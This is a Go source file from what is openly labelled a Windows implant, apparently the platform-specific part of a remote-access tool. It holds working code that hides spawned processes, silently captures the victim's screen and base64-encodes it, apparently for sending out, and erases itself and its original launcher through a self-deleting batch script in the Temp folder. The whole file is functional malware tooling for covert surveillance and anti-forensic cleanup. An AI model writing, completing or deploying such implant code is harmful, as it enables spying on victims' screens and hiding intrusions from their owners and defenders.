// implant/exec_attrs_windows.go
//go:build windows

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/png" // Or image/jpeg
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
)

func init() {
	doSelfDelete = doSelfDeleteWindows
	setOSSpecificAttrs = setOSSpecificAttrsWindows
	takeScreenshot = takeScreenshotWindows
}

func setOSSpecificAttrsWindows(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
}

func takeScreenshotWindows() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "", fmt.Errorf("no active displays found")
	}

	bounds := screenshot.GetDisplayBounds(0)
	if bounds.Dx() == 0 || bounds.Dy() == 0 {
		return "", fmt.Errorf("failed to get valid display bounds for display 0 (empty or zero-size)")
	}

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", fmt.Errorf("failed to capture screen: %w", err)
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return "", fmt.Errorf("failed to encode png: %w", err)
	}

	imgBase64Str := base64.StdEncoding.EncodeToString(buf.Bytes())
	return imgBase64Str, nil
}

// doSelfDeleteWindows now accepts two paths.
// selfExePath: path to the currently running executable (the one in Temp).
// originalLauncherPath: path to the initial executable that launched this one (can be empty).
// IMPORTANT: This function will call os.Exit(0) to terminate the current implant process.
func doSelfDeleteWindows(selfExePath string, originalLauncherPath string) {
	absSelfExePath, err := filepath.Abs(selfExePath)
	if err != nil {
		// If we can't get the absolute path for self, critical failure for self-delete.
		os.Exit(1)
		return
	}

	absOriginalLauncherPath := ""
	if originalLauncherPath != "" {
		path, err := filepath.Abs(originalLauncherPath)
		if err == nil { // Only use it if we can get an absolute path
			absOriginalLauncherPath = path
		}
	}

	// Base part of the batch script
	batchContentBase := `@echo off
chcp 65001 > nul
setlocal
set "selfTargetFile=%s"
set "maxRetries=10"

:: Give the calling process (the implant) time to exit
timeout /t 3 /nobreak > nul
`
	// Part to delete the original launcher (if path is provided)
	deleteOriginalLauncherCmd := ""
	if absOriginalLauncherPath != "" {
		deleteOriginalLauncherCmd = fmt.Sprintf(`
:: Attempt to delete the original launcher
del /F /Q "%s"
`, absOriginalLauncherPath)
	}

	// Part to delete the current (self) executable with retries
	deleteSelfCmd := fmt.Sprintf(`
:: Attempt to delete the current executable (self)
FOR /L %%N IN (1,1,%%maxRetries%%) DO (
    del /F /Q "%%selfTargetFile%%"
    if not exist "%%selfTargetFile%%" (
        goto :cleanup
    )
    timeout /t 2 /nobreak > nul
)

:cleanup
endlocal
:: Delete this batch script itself
del "%%~f0"
exit /b
`) // Note: selfTargetFile is passed to the base format string

	// Combine the parts:
	// Pass absSelfExePath to the base format string. The deleteSelfCmd uses the variable set in the batch.
	batchContent := fmt.Sprintf(batchContentBase, absSelfExePath) + deleteOriginalLauncherCmd + deleteSelfCmd

	tempDir := os.TempDir()
	// Use PID and nanoseconds for a more unique batch file name
	batchFileName := fmt.Sprintf("sdel_all_%d_%d.bat", os.Getpid(), time.Now().UnixNano())
	batchFilePath := filepath.Join(tempDir, batchFileName)

	err = os.WriteFile(batchFilePath, []byte(batchContent), 0700)
	if err != nil {
		// Failed to write batch file, exit.
		os.Exit(1)
		return
	}

	cmd := exec.Command("cmd.exe", "/C", batchFilePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}

	err = cmd.Start()
	if err != nil {
		_ = os.Remove(batchFilePath) // Clean up batch file if it couldn't be started
		os.Exit(1)                   // Exit if batch script launch fails
		return
	}

	// Release the child process so it can continue after this parent (implant) exits.
	if cmd.Process != nil {
		_ = cmd.Process.Release()
	}

	// THE IMPLANT PROCESS MUST EXIT NOW for the batch script to be able to delete its .exe file.
	os.Exit(0)
}
